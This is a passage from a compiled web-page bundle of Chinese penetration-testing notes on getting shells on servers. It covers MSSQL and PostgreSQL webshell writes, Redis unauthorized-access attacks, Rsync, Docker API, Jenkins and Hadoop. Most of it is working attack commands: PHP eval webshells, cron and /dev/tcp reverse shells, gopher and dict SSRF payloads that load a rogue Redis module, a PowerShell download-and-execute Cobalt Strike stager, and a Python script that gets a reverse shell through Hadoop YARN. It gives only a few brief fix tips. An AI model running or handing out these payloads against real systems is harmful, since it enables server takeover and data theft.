<span class="token keyword">insert</span> <span class="token keyword">into</span> cmd <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token number">0x3C25657865637574652872657175657374282261222929253E</span><span class="token punctuation">)</span> 
<span class="token keyword">backup</span> log 库名 <span class="token keyword">to</span> <span class="token keyword">disk</span> <span class="token operator">=</span> <span class="token string">&#39;C:\\www\\shell.asp&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>相对于差异备份，log 备份出来的 webshell 文件体积非常的小。</p><h2 id="postgresql执行命令" tabindex="-1"><a class="header-anchor" href="#postgresql执行命令" aria-hidden="true">#</a> PostgreSQL执行命令</h2><details class="custom-container details"><summary>用户权限说明</summary><ol><li><p>login: 可登录</p></li><li><p>superuser:数据库超级用户</p></li><li><p>createdb:创建数据库权限</p></li><li><p>createrole:创建和删除其他普通用户的权限</p></li><li><p>replication:流复制时用到的一个用户属性，需要单独设定</p></li><li><p>password:登录时需要指定密码</p></li><li><p>inherit:用户组对组员的一个集成标识，成员可以集成用户组的特性权限</p></li></ol></details><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#连接数据库</span>
psql <span class="token parameter variable">-U</span> dbuser <span class="token parameter variable">-d</span> exampledb <span class="token parameter variable">-h</span> <span class="token function">ip</span> <span class="token parameter variable">-p</span> <span class="token number">5432</span>

<span class="token comment">#查看当前系统版本</span>
<span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">#列出系统目录</span>
<span class="token keyword">select</span> pg_ls_dir<span class="token punctuation">(</span><span class="token string">&#39;/etc&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">#读取系统文件100行</span>
<span class="token keyword">select</span> pg_read_file<span class="token punctuation">(</span><span class="token string">&#39;postgresql.auto.conf&#39;</span>,0,100<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">#写入文件：(两种方式)</span>
create table shell<span class="token punctuation">(</span>shell text not null<span class="token punctuation">)</span><span class="token punctuation">;</span>
insert into shell values<span class="token punctuation">(</span><span class="token variable">$$</span><span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>sec<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span><span class="token variable">$$</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
copy shell<span class="token punctuation">(</span>shell<span class="token punctuation">)</span> to <span class="token string">&#39;/var/www/html/shell.php&#39;</span><span class="token punctuation">;</span>

copy <span class="token punctuation">(</span>select <span class="token string">&#39;cmd&#39;</span><span class="token punctuation">)</span> to <span class="token string">&#39;/var/www/html/shell.php&#39;</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="postgresql-8-2执行命令" tabindex="-1"><a class="header-anchor" href="#postgresql-8-2执行命令" aria-hidden="true">#</a> Postgresql 8.2执行命令</h3><p>Postgresql 8.2以下的版本直接调用/lib/libc.so.6或者/lib64/libc.so.6，可以执行命令</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>create <span class="token keyword">function</span> system<span class="token punctuation">(</span>cstring<span class="token punctuation">)</span> returns int AS <span class="token string">&#39;/lib/libc.so.6&#39;</span>, <span class="token string">&#39;system&#39;</span> language C strict<span class="token punctuation">;</span>
create <span class="token keyword">function</span> system<span class="token punctuation">(</span>cstring<span class="token punctuation">)</span> returns int AS <span class="token string">&#39;/lib64/libc.so.6&#39;</span>, <span class="token string">&#39;system&#39;</span> language C strict<span class="token punctuation">;</span>
<span class="token keyword">select</span> system<span class="token punctuation">(</span><span class="token string">&#39;id&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>需要注意的是：Ubuntu中libc.so.6位于/lib/x86_64-linux-gnu目录下。</p><p>高版本的系统存在安全机制无法调用系统libc.sso.6，需要手动利用UDF进行命令执行。</p><p>先查看postgresql支持的扩展语言：select * from pg_language; Postgresql默认支持C，可以自己编译so库去创建执行命令的函数利用。</p><h3 id="cve-2019-9193" tabindex="-1"><a class="header-anchor" href="#cve-2019-9193" aria-hidden="true">#</a> CVE-2019-9193</h3><p>PostpreSQL 9.3-11.2 允许经过身份验证的superuser或者拥有pg_read_server_files权限的用户执行任意命令</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>drop table <span class="token keyword">if</span> exists cmd_exec<span class="token punctuation">;</span>
create table cmd_exec<span class="token punctuation">(</span>cmd_output text<span class="token punctuation">)</span><span class="token punctuation">;</span>
copy cmd_exec from program <span class="token string">&#39;id&#39;</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> * from cmd_exec<span class="token punctuation">;</span>
drop table <span class="token keyword">if</span> exists cmd_exec<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="custom-container tip"><p class="custom-container-title">注意</p><p>命令中的单引号需要用双引号进行转义</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> <span class="token string">&#39;test&#39;</span> <span class="token operator">&gt;&gt;</span> <span class="token string">&#39;echo &quot;test&quot;;&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></div><h2 id="redis未授权访问" tabindex="-1"><a class="header-anchor" href="#redis未授权访问" aria-hidden="true">#</a> Redis未授权访问</h2><details class="custom-container details"><summary>利用条件</summary><p>影响版本：Redis 2.x，3.x，4.x，5.x</p><ol><li><code>redis</code>服务以root账户运行</li><li><code>redis</code>无密码或弱密码进行认证</li><li><code>redis</code>监听在0.0.0.0上</li></ol></details><details class="custom-container details"><summary>修复方案</summary><p>1、Redis使用强口令登录</p><p>2、禁止使用root权限启动redis服务</p></details><p><strong>获取Info</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>./redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.111
<span class="token number">192.168</span>.1.111:673<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span> info
keys *				<span class="token comment">#查看所有key</span>
get key_name	<span class="token comment">#查看key的值，例如get password</span>
flushall			<span class="token comment">#删除所有数据</span>
del key				<span class="token comment">#删除键为key的数据</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="ssh公钥登录" tabindex="-1"><a class="header-anchor" href="#ssh公钥登录" aria-hidden="true">#</a> SSH公钥登录</h3><details class="custom-container details"><summary>原理</summary><p>原理就是在数据库中插入一条数据，将本机的公钥作为value，(key值随意)</p><p>然后通过修改数据库的默认路径为<code>/root/.ssh</code>和默认的缓冲文件<code>authorized.keys</code></p><p>把缓冲的数据保存在文件里，这样就可以在服务器端的<code>/root/.ssh</code>下生一个授权的key</p></details><p>1）首先在自己的电脑上生成公钥</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ssh-keygen <span class="token parameter variable">-t</span> rsa
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>将公钥导入<code>key.txt</code>文件（前后用\\n\\n换行，避免和<code>Redis</code>里其他缓存数据混合）</p><p>再把<code>key.txt</code>文件内容写入目标主机的缓冲里。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">(</span>echo <span class="token parameter variable">-e</span> <span class="token string">&quot;<span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span>&quot;</span><span class="token punctuation">;</span> <span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">&quot;<span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span>&quot;</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> key.txt

<span class="token function">cat</span> key.txt <span class="token operator">|</span> ./redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.10.153 <span class="token parameter variable">-x</span> <span class="token builtin class-name">set</span> <span class="token builtin class-name">test</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2）连接目标主机的<code>Redis</code></p><p>设置<code>redis</code>的备份路径为/root/.ssh和保存文件名authorized_keys</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>./redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.111
config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.ssh
config <span class="token builtin class-name">set</span> dbfilename authorized_keys

keys *
get <span class="token builtin class-name">test</span>	<span class="token comment">#查看数据是否存在</span>
save		<span class="token comment">#将（缓存里的数据key.txt）保存在服务器硬盘上</span>

<span class="token comment">#SSH 连接目标主机，无需密码即可登录</span>
<span class="token function">ssh</span> <span class="token number">192.168</span>.1.111
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="计划任务反弹shell" tabindex="-1"><a class="header-anchor" href="#计划任务反弹shell" aria-hidden="true">#</a> 计划任务反弹shell</h3><p>通过crontab定时任务反弹shell，原理和写公钥一样</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#首先在客户端(攻击者)这边监听一个端口，端口不要冲突</span>
<span class="token function">nc</span> <span class="token parameter variable">-lv</span> <span class="token number">6666</span>

<span class="token comment">#连接redis，写入反弹shell</span>
./redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.111
<span class="token builtin class-name">set</span> test2 <span class="token string">&quot;<span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span>*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/客户端IP/6666 0&gt;&amp;1<span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span>&quot;</span>
config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron
config <span class="token builtin class-name">set</span> dbfilename root
save
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="dict协议反弹shell" tabindex="-1"><a class="header-anchor" href="#dict协议反弹shell" aria-hidden="true">#</a> DICT协议反弹shell</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#查看当前redis的相关配置</span>
ssrf.php?url<span class="token operator">=</span>dict://192.168.172.131:6379/info

<span class="token comment">#设置备份文件名</span>
ssrf.php?url<span class="token operator">=</span>dict://192.168.172.131:6379/config:set:dbfilename:exp.so

<span class="token comment">#连接恶意Redis服务器</span>
ssrf.php?url<span class="token operator">=</span>dict://192.168.172.131:6379/slaveof:192.168.172.129:1234

<span class="token comment">#加载恶意模块</span>
ssrf.php?url<span class="token operator">=</span>dict://192.168.172.131:6379/module:load:./exp.so

<span class="token comment">#切断主从复制</span>
ssrf.php?url<span class="token operator">=</span>dict://192.168.172.131:6379/slaveof:no:one

<span class="token comment">#执行系统命令</span>
 ssrf.php?url<span class="token operator">=</span>dict://192.168.172.131:6379/system.rev:192.168.172.129:9999
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="gopher协议反弹shell" tabindex="-1"><a class="header-anchor" href="#gopher协议反弹shell" aria-hidden="true">#</a> GOPHER协议反弹shell</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#设置文件名，连接恶意Redis服务器</span>
gopher://192.168.172.131:6379/_config%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520192.168.172.129%25201234%250d%250aquit

<span class="token comment">#加载exp.so，反弹shell</span>
gopher://192.168.172.131:6379/_module%2520load%2520./exp.so%250d%250asystem.rev%2520192.168.172.129%25209999%250d%250aquit
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="网站目录写webshell" tabindex="-1"><a class="header-anchor" href="#网站目录写webshell" aria-hidden="true">#</a> 网站目录写Webshell</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>./redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.111

config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/html
<span class="token builtin class-name">set</span> shell <span class="token string">&quot;<span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span>&lt;?php @eval(<span class="token variable">$_POST</span>[&#39;wintry&#39;]);?&gt;<span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span>&quot;</span>
config <span class="token builtin class-name">set</span> dbfilename shell.php
save
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="slave主从模式利用" tabindex="-1"><a class="header-anchor" href="#slave主从模式利用" aria-hidden="true">#</a> Slave主从模式利用</h3><p>如果当把数据存储在单个<code>Redis</code>的实例中，当读写体量比较大的时候，服务端就很难承受。</p><p>为了应对这种情况，<code>Redis</code>就提供了主从模式，主从模式就是指使用一个<code>redis</code>实例作为主机，其他实例都作为备份机。其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p>Redis模块</p><p>和<code>mysql</code>类似，<code>redis</code>也支持扩展命令，我们需要编写so文件，来扩展命令。</p><blockquote><p>1、我们伪装成redis数据库，然后受害者将我们的数据库设置为主节点。</p><p>2、我们设置备份文件名为恶意的.so文件</p><p>3、设置传输方式为全量传输</p><p>4、加载so文件，实现任意命令执行</p></blockquote><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>./redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.1.111
MODULE LOAD /root/redis-rogue-server/exp.so
system.exec <span class="token string">&quot;whoami&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,79),I={href:"https://github.com/vulhub/redis-rogue-getshell",target:"_blank",rel:"noopener noreferrer"},N=o(`<h3 id="windows启动项上线" tabindex="-1"><a class="header-anchor" href="#windows启动项上线" aria-hidden="true">#</a> Windows启动项上线</h3><p>windows平台上的利用除了网站目录写webshell就是启动项上线了，其它办法不能利用。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#网站绝对路径写Webshell</span>
config <span class="token builtin class-name">set</span> <span class="token function">dir</span> D:/phpstudy_pro/WWW
config <span class="token builtin class-name">set</span> dbfilename shell.php
<span class="token builtin class-name">set</span> x <span class="token string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>
save
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>启动项上线CS木马</p><p>使用Attacks – Web Drive-By – Script Web Delivery，生成ps上线命令</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#由于Start Menu之间有空格，因此需要用双引号将路径包含</span>
config <span class="token builtin class-name">set</span> <span class="token function">dir</span> <span class="token string">&quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;</span>

config <span class="token builtin class-name">set</span> dbfilename shell.bat
<span class="token builtin class-name">set</span> x “rnrnpowershell.exe <span class="token parameter variable">-nop</span> <span class="token parameter variable">-w</span> hidden <span class="token parameter variable">-c</span> ”IEX <span class="token variable"><span class="token punctuation">((</span>new<span class="token operator">-</span>object net.webclient<span class="token punctuation">)</span>.downloadstring<span class="token punctuation">(</span>‘http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.105</span><span class="token operator">:</span><span class="token number">80</span><span class="token operator">/</span>a’<span class="token punctuation">))</span></span>”rnrn”
<span class="token comment">#这是CS用团队服务器生成的马</span>

save
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="rsync-未授权访问漏洞" tabindex="-1"><a class="header-anchor" href="#rsync-未授权访问漏洞" aria-hidden="true">#</a> Rsync 未授权访问漏洞</h2><p>Rsync（remote synchronize）是一个远程数据同步工具。</p><p>可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。</p><p>Rsync 默认允许匿名访问，默认端口837。</p><p>1、漏洞利用</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#列举整个同步目录或指定目录：</span>
<span class="token function">rsync</span> rsync://172.16.2.250:873/src

<span class="token comment">#下载文件或目录到本地：</span>
<span class="token function">rsync</span> rsync://172.16.2.250:873/src/etc/passwd ./

<span class="token comment">#上传本地文件到服务端：</span>
<span class="token function">rsync</span> <span class="token parameter variable">-av</span> <span class="token function">nc</span> rsync://172.16.2.250:873/src/etc/cron.hourly

<span class="token comment">#上传的文件可以直接是webshell或crontab反弹shell</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2、修复建议</p><ul><li>添加认证</li><li>限制IP访问</li></ul><h2 id="docker未授权访问" tabindex="-1"><a class="header-anchor" href="#docker未授权访问" aria-hidden="true">#</a> Docker未授权访问</h2><p>docker remote api 可以执行docker命令，docker守护进程监听在0.0.0.0，可直接调用API来操作docker</p><p>1、验证</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">docker</span> <span class="token parameter variable">-H</span> tcp://10.1.1.211:2375 version

<span class="token comment">#列出容器信息</span>
<span class="token function">curl</span> http://<span class="token operator">&lt;</span>target<span class="token operator">&gt;</span>:2375/containers/json
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2、漏洞利用，反弹宿主机shell</p><p>新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">sudo</span> <span class="token function">docker</span> <span class="token parameter variable">-H</span> tcp://10.1.1.211:2375 run <span class="token parameter variable">-it</span> <span class="token parameter variable">-v</span> /:/mnt nginx:latest /bin/bash
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在容器内执行命令，将反弹shell的脚本写入到/var/spool/cron/root</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> <span class="token string">&#39;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.1.1.214/1234 0&gt;&amp;1&#39;</span> <span class="token operator">&gt;&gt;</span> /mnt/var/spool/cron/crontabs/root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>本地监听端口，获取宿主机shell</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvp</span> <span class="token number">1234</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>3、修复建议</p><ul><li>对2375端口做访问控制</li></ul><h2 id="jenkins未授权访问" tabindex="-1"><a class="header-anchor" href="#jenkins未授权访问" aria-hidden="true">#</a> Jenkins未授权访问</h2><p>1、访问<code>http://www.xxx.com:8080/manage</code></p><p>2、点击脚本命令行</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>println <span class="token string">&quot;whoami&quot;</span>.execute<span class="token punctuation">(</span><span class="token punctuation">)</span>.text
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>3、漏洞利用，写入webshell</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>new File <span class="token punctuation">(</span><span class="token string">&quot;/var/www/html/shell.php&quot;</span><span class="token punctuation">)</span>.write<span class="token punctuation">(</span><span class="token string">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>4、修复建议</p><ul><li>升级版本</li><li>添加认证、设置强密码复杂度及账号锁定</li><li>避免把Jenkins直接暴露在公网</li></ul><h2 id="hadoop-未授权访问" tabindex="-1"><a class="header-anchor" href="#hadoop-未授权访问" aria-hidden="true">#</a> Hadoop 未授权访问</h2><p>Hadoop是一个由Apache基金会所开发的分布式系统基础架构.</p><p>由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口.</p><p>黑客可以通过命令行操作多个目录下的数据，如删除，下载，浏览、命令执行等操作，危害极大.</p><p>1、验证</p><p>访问 <code>http://192.168.18.129:8088/cluster</code></p><p>2、通过REST API命令执行</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>在本地监听端口 <span class="token operator">&gt;&gt;</span> 创建Application <span class="token operator">&gt;&gt;</span> 调用Submit Application API提交

<span class="token comment">#本地监听9999端口</span>
<span class="token function">nc</span> <span class="token parameter variable">-lvp</span> <span class="token number">9999</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>3、EXP漏洞利用</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">import</span> requests
target <span class="token operator">=</span> <span class="token string">&#39;http://192.168.18.129:8088/&#39;</span>
lhost <span class="token operator">=</span> <span class="token string">&#39;192.168.18.138&#39;</span> <span class="token comment"># put your local host ip here, and listen at port 9999</span>

url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">&#39;ws/v1/cluster/apps/new-application&#39;</span>
resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
app_id <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#39;application-id&#39;</span><span class="token punctuation">]</span>
url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">&#39;ws/v1/cluster/apps&#39;</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">&#39;application-id&#39;</span><span class="token punctuation">:</span> app_id<span class="token punctuation">,</span>
    <span class="token string">&#39;application-name&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;get-shell&#39;</span><span class="token punctuation">,</span>
    <span class="token string">&#39;am-container-spec&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;commands&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
            <span class="token string">&#39;command&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#39;</span> <span class="token operator">%</span> lhost<span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token string">&#39;application-type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;YARN&#39;</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,45);function O(W,D){const i=c("Tabs"),r=c("ExternalLinkIcon");return u(),k("div",null,[v,p(i,{id:"10",data:[{title:"python2"},{title:"Python3"}]},{tab0:a(({title:e,value:t,isActive:l})=>[b]),tab1:a(({title:e,value:t,isActive:l})=>[h]),_:1}),g,p(i,{id:"21",data:[{title:"Linux"},{title:"Windows"}]},{tab0:a(({title:e,value:t,isActive:l})=>[y]),tab1:a(({title:e,value:t,isActive:l})=>[w]),_:1}),f,p(i,{id:"32",data:[{title:"Linux"},{title:"Windows"}]},{tab0:a(({title:e,value:t,isActive:l})=>[x]),tab1:a(({title:e,value:t,isActive:l})=>[_]),_:1}),q,s("div",S,[E,p(i,{id:"60",data:[{title:"Linux"},{title:"Windows"}]},{tab0:a(({title:e,value:t,isActive:l})=>[C]),tab1:a(({title:e,value:t,isActive:l})=>[A]),_:1})]),P,p(i,{id:"97",data:[{title:"outfile"},{title:"dumpfile"}]},{tab0:a(({title:e,value:t,isActive:l})=>[L]),tab1:a(({title:e,value:t,isActive:l})=>[T]),_:1}),R,s("p",null,[n("现成的工具，exp利用脚本："),s("a",I,[n("redis-rce"),p(r)])]),N])}const V=d(m,[["render",O],["__file","Getshell权限获取.html.vue"]]);export{V as default};
